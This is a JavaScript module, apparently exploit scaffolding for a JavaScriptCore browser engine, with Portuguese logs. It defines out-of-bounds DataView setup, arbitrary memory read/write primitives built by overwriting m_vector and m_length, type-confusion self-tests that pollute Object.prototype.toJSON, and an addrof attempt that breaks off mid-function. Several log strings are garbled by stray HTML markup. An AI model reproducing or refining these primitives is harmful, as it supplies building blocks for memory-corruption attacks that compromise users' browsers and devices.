// js/core_exploit.mjs (v31.8 - Versão Completa e Corrigida)

import { AdvancedInt64 as Utils_AdvancedInt64_Ref, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const AdvancedInt64 = Utils_AdvancedInt64_Ref;

function _local_isAdvancedInt64Object(obj) {
    const check = obj &&
        typeof obj === 'object' &&
        obj.constructor &&
        obj.constructor.name === 'AdvancedInt64' &&
        typeof obj.low === 'function' &&
        typeof obj.high === 'function' &&
        typeof obj.equals === 'function' &&
        typeof obj.toString === 'function';
    return check;
}

const toHexHelper = (val, bits = 32) => {
    if (_local_isAdvancedInt64Object(val)) {
        try {
            const strVal = val.toString(true);
            if (typeof strVal === 'string' && strVal !== 'undefined') {
                return strVal;
            }
        } catch (e) { /* ignora, usa fallback */ }
        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        try {
            if (oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true);
            }
        } catch (e) { /* ignora */ }

        if (oob_array_buffer_real && oob_dataview_real &&
            oob_array_buffer_real.byteLength === getOOBAllocationSize() &&
            oob_dataview_real.buffer === oob_array_buffer_real &&
            currentLength === 0xFFFFFFFF) {
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas inconsistente/não expandido. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }
    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length do oob_dataview_real expandido para 0xFFFFFFFF no offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`, 'info', FNAME_TRIGGER);
        } else {
            const errorMsg = `Falha ao expandir m_length: currentAllocSize (${currentAllocSize}) é muito pequeno para o offset ${toHex(OOB_DV_M_LENGTH_OFFSET)}.`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }

        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=<span class="math-inline">\{oob\_dataview\_real\.byteOffset\}, length\=</span>{oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true)} bytes (m_length expandido)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_read_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_READ);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_read_absolute.");
    }
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) {
        const errorMsg = `oob_read_absolute (offset ${toHex(offset_in_oob_buffer)}, tam <span class="math-inline">\{byteLength\}\) fora dos limites do oob\_array\_buffer\_real \(0\-</span>{oob_array_buffer_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(offset_in_oob_buffer);
            case 2: return oob_dataview_real.getUint16(offset_in_oob_buffer, true);
            case 4: return oob_dataview_real.getUint32(offset_in_oob_buffer, true);
            case 8: {
                const low = oob_dataview_real.getUint32(offset_in_oob_buffer, true);
                const high = oob_dataview_real.getUint32(offset_in_oob_buffer + 4, true);
                const result = new AdvancedInt64(low, high);
                return result;
            }
            default:
                log(`ERRO: Tamanho de leitura inválido para oob_read_absolute: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for oob_read_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em <span class="math-inline">\{FNAME\_READ\} ao ler de oob\_buffer\[</span>{toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_READ);
        console.error(`[${FNAME_READ}] Exception: `, e);
        if (e.message.includes("detached")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || !oob_array_buffer_real || oob_array_buffer_real.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para oob_write_absolute em ${toHex(offset_in_oob_buffer)}`, "error", FNAME_WRITE);
        throw new Error("Ambiente OOB não inicializado/inválido para oob_write_absolute.");
    }
    if (offset_in_oob_buffer < 0 || (offset_in_oob_buffer + byteLength) > oob_array_buffer_real.byteLength) {
        const errorMsg = `oob_write_absolute (offset ${toHex(offset_in_oob_buffer)}, tam <span class="math-inline">\{byteLength\}\) fora dos limites do oob\_array\_buffer\_real \(0\-</span>{oob_array_buffer_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }
    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(offset_in_oob_buffer, Number(value)); break;
            case 2: oob_dataview_real.setUint16(offset_in_oob_buffer, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(offset_in_oob_buffer, Number(value), true); break;
            case 8:
                let val64 = value;
                if (!_local_isAdvancedInt64Object(val64)) {
                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
                        throw new TypeError(`Valor para oob_write_absolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
                    }
                    if (!_local_isAdvancedInt64Object(val64)) {
                        throw new TypeError(`Valor convertido para oob_write_absolute de 8 bytes não é um AdvancedInt64 válido.`);
                    }
                }
                oob_dataview_real.setUint32(offset_in_oob_buffer, val64.low(), true);
                oob_dataview_real.setUint32(offset_in_oob_buffer + 4, val64.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para oob_write_absolute: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for oob_write_absolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em <span class="math-inline">\{FNAME\_WRITE\} ao escrever em oob\_buffer\[</span>{toHex(offset_in_oob_buffer)}]: ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached")) { isOOBEnvironmentSetup = false; }
        throw e;
    }
}

export function isOOBReady() {
    let mLengthExpanded = false;
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real) {
        try {
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) {
                mLengthExpanded = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF);
            }
        } catch (e) { mLengthExpanded = false; }
    }
    return isOOBEnvironmentSetup &&
        oob_array_buffer_real instanceof ArrayBuffer &&
        oob_dataview_real instanceof DataView &&
        oob_array_buffer_real.byteLength > 0 &&
        oob_dataview_real.buffer === oob_array_buffer_real &&
        mLengthExpanded;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) {
    const FNAME_RESET = `${fname_parent_for_log}._explicit_dv_reset`;
    try {
        if (isOOBReady()) {
            const temp_val = oob_read_absolute(0, 1);
            oob_write_absolute(0, temp_val, 1);
        }
    } catch (e) {
        log(`    [${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
    }
}

export async function arb_read(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.arb_read (v31.7)';
    if (!isOOBReady()) {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!_local_isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_read deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!_local_isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_read não é AdvancedInt64 válido.`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    let result_val = null;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);

        if (!_local_isAdvancedInt64Object(m_vector_orig_snap)) {
            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
            isOOBEnvironmentSetup = false;
            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_read (verif. local).");
        }

        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        switch (byteLength) {
            case 1: result_val = oob_dataview_real.getUint8(0); break;
            case 2: result_val = oob_dataview_real.getUint16(0, true); break;
            case 4: result_val = oob_dataview_real.getUint32(0, true); break;
            case 8: {
                const low = oob_dataview_real.getUint32(0, true);
                const high = oob_dataview_real.getUint32(4, true);
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for arb_read: ${byteLength}`);
        }
        return result_val;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        throw e;
    } finally {
        if (_local_isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
            } catch (e_restore) {
                log(`ERRO ${FNAME} restaurando/resetando metadados: ${e_restore.message}`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
            log(` ${FNAME} não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 (verif. local). Ambiente instável.`, 'critical');
            isOOBEnvironmentSetup = false;
        }
    }
}

export async function arb_write(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.arb_write (v31.7)';
    if (!isOOBReady()) {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!_local_isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!_local_isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_write não é AdvancedInt64 válido.`);
        }
    }

    let m_vector_orig_snap, m_length_orig_snap, m_mode_orig_snap;
    try {
        m_vector_orig_snap = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        m_length_orig_snap = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        m_mode_orig_snap = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);

        if (!_local_isAdvancedInt64Object(m_vector_orig_snap)) {
            log(`[${FNAME}] ALERTA CRÍTICO: m_vector_orig_snap NÃO é AdvancedInt64 após leitura (verif. local). Tipo: ${typeof m_vector_orig_snap}. Construtor: ${m_vector_orig_snap?.constructor?.name}. Valor: ${toHexHelper(m_vector_orig_snap)}. A restauração falhará.`, 'critical');
            isOOBEnvironmentSetup = false;
            throw new Error("Falha ao ler m_vector original como AdvancedInt64 em arb_write (verif. local).");
        }

        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);

        let val64_write;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = _local_isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                if (!_local_isAdvancedInt64Object(val64_write)) {
                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
                }
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Invalid byteLength para arb_write");
        }
    } finally {
        if (_local_isAdvancedInt64Object(m_vector_orig_snap) && typeof m_length_orig_snap === 'number' && typeof m_mode_orig_snap === 'number' && isOOBReady()) {
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
            } catch (eR) {
                log(`ERRO ${FNAME} restaurando/resetando metadados: ${eR.message}`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else if (isOOBReady()) {
            log(` ${FNAME} não pôde restaurar metadados porque m_vector_orig_snap não era AdvancedInt64 (verif. local). Ambiente instável.`, 'critical');
            isOOBEnvironmentSetup = false;
        }
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.7 - com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50;
        const test_val32 = 0x11223344;
        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em ${toHex(test_offset)}`, 'debug', FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de ${toHex(test_offset)}`, 'debug', FNAME_TEST);

        if (read_val32 === test_val32) {
            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_offset = test_offset + 16;
        if (next_offset + 8 > oob_array_buffer_real.byteLength) {
            currentLog(`    (64bit Test) ERRO: Offset <span class="math-inline">\{toHex\(next\_offset\)\} fora dos limites do buffer \(</span>{oob_array_buffer_real.byteLength})`, "error", FNAME_TEST);
            throw new Error("Offset para teste 64bit fora dos limites");
        }
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    (64bit Test) Escrevendo (test_val64): ${toHexHelper(test_val64)} em ${toHex(next_offset)}`, 'debug', FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8);

        const raw_low_selftest = oob_dataview_real.getUint32(next_offset, true);
        const raw_high_selftest = oob_dataview_real.getUint32(next_offset + 4, true);
        currentLog(`    (64bit Test) SelfTest DEBUG: Raw low from DV: 0x${raw_low_selftest.toString(16)}, Raw high from DV: 0x${raw_high_selftest.toString(16)}`, 'debug', FNAME_TEST);

        const read_val64 = oob_read_absolute(next_offset, 8);
        currentLog(`    (64bit Test) Lido de ${toHex(next_offset)}. Tipo retornado: ${typeof read_val64}.`, 'debug', FNAME_TEST);

        if (_local_isAdvancedInt64Object(read_val64)) {
            currentLog(`    (64bit Test) Verificação local de tipo: OK. Valor lido (read_val64): ${toHexHelper(read_val64)}`, 'debug', FNAME_TEST);
            if (read_val64.low() === test_val64.low() && read_val64.high() === test_val64.high()) {
                currentLog(`    (64bit Test) SUCESSO: Lido ${toHexHelper(read_val64)} (low/high) corretamente.`, "good", FNAME_TEST);
                success64 = true;
            } else {
                currentLog(`    (64bit Test) FALHA: Componentes low/high não correspondem. Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
                currentLog(`        Lido  : low=0x${read_val64.low().toString(16)}, high=0x${read_val64.high().toString(16)}`, "error", FNAME_TEST);
                currentLog(`        Esperado: low=0x${test_val64.low().toString(16)}, high=0x${test_val64.high().toString(16)}`, "error", FNAME_TEST);
            }
        } else {
            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é reconhecido como um objeto AdvancedInt64 pela verificação local. Construtor: ${read_val64?.constructor?.name}. Valor: ${String(read_val64)} Esperado: ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
        }

        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, 'test', FNAME_TEST);
        return success32 && success64;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        return false;
    }
}

// ... (selfTestTypeConfusionAndMemoryControl e attemptAddrofUsingCoreHeisenbug como na v31.5) ...
const HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_OFFSET_core = HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core;
const HEISENBUG_CRITICAL_WRITE_VALUE_core = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE_core = 64;

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado (v31.7): Type Confusion e Controle de Memória ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null;
    let overallSuccess = false;
    let tcPhaseSuccess = false;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        currentLog(`    (TC SelfTest) Alvo da corrupção OOB: ${toHex(HEISENBUG_CRITICAL_WRITE_OFFSET_core)}`, 'info', FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE_core} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function () {
            local_probe_details_for_selftest = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_direct_ref: (this === victim_ab_for_selftest)
            };
            return { self_test_probe_executed_tc: true, observed_this_type: local_probe_details_for_selftest.this_type_in_toJSON };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`            (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);

        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
        currentLog(`            (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST);
        currentLog(`            (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC SelfTest) SUCESSO (ou SUCESSO PARCIAL): Confusão de tipo detectada! 'this' é [object Object]. (is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref})`, "vuln", FNAME_TEST);
            tcPhaseSuccess = true;
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim_direct_ref=<span class="math-inline">\{local\_probe\_details\_for\_selftest\.is\_victim\_direct\_ref\}, type\=</span>{local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado tipo [object Object].`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): <span class="math-inline">\{e\.message\}</span>{e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`            (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
    }

    if (!tcPhaseSuccess) {
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
    } else {
        await PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
        let memoryControlPhaseSuccess = false;
        try {
            if (!isOOBReady()) {
                currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
                await triggerOOB_primitive({ force_reinit: true });
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
            const OFFSET_M_MODE_TARGET = OOB_DV_M_MODE_OFFSET;

            const PLANT_M_LENGTH = 0xBABEFACE;
            const PLANT_M_MODE = 0x00000001;

            currentLog(`    (MC) Configurando m_length e m_mode...`, 'info', FNAME_TEST);
            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4);
            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);
            currentLog(`        m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}) para ${toHex(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
            currentLog(`        m_mode (@${toHex(OFFSET_M_MODE_TARGET)}) para ${toHex(PLANT_M_MODE)}`, 'info', FNAME_TEST);

            currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4);
            const read_m_mode_val = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);

            currentLog(`        Lido m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}): ${toHex(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode    (@${toHex(OFFSET_M_MODE_TARGET)}): ${toHex(read_m_mode_val)}`, "leak", FNAME_TEST);

            if (read_m_length_val === PLANT_M_LENGTH && read_m_mode_val === PLANT_M_MODE) {
                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
                memoryControlPhaseSuccess = true;
            } else {
                if (read_m_length_val !== PLANT_M_LENGTH) {
                    currentLog(`    (MC) FALHA: m_length lido (<span class="math-inline">\{toHex\(read\_m\_length\_val\)\}\) não corresponde ao plantado \(</span>{toHex(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
                }
                if (read_m_mode_val !== PLANT_M_MODE) {
                    currentLog(`    (MC) FALHA: m_mode lido (<span class="math-inline">\{toHex\(read\_m\_mode\_val\)\}\) não corresponde ao plantado \(</span>{toHex(PLANT_M_MODE)}).`, "error", FNAME_TEST);
                }
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): <span class="math-inline">\{e\.message\}</span>{e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        }
        if (tcPhaseSuccess && memoryControlPhaseSuccess) {
            overallSuccess = true;
        }
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

let _targetObjectForAddrofProbe_core_internal_v31_7 = null;
let _heisenbugConfirmedByProbe_core_internal_v31_7 = false;

function _toJSONProbeForAddrofInCoreInternal_v31_7() {
    let currentThisType = Object.prototype.toString.call(this);
    if (currentThisType === '[object Object]') {
        _heisenbugConfirmedByProbe_core_internal_v31_7 = true;
        if (_targetObjectForAddrofProbe_core_internal_v31_7) {
            try { this[0] = _targetObjectForAddrofProbe_core_internal_v31_7; } catch (e_write) {
                log(`[CoreAddrofProbeInternal_v31_7] Erro ao tentar this[0] = target: ${e_write.message}`, 'warn');
            }
        }
    } else { _heisenbugConfirmedByProbe_core_internal_v31_7 = false; }
    return { core_addrof_probe_executed: true, type_seen: currentThisType };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) {
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
    log(`[${FNAME_FUNC}] AVISO: Primitiva addrof (Heisenbug) é conhecida por falhar no ambiente atual. Tentando (v31.7)...`, "warn", FNAME_FUNC);
    _targetObjectForAddrofProbe_core_internal_v31_7 = targetObject;
    _heisenbugConfirmedByProbe_core_internal_v31_7 = false;
    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado.", leaked_address_as_double: NaN, leaked_address_as_int64: null };
    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCoreAddrof = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof."); }
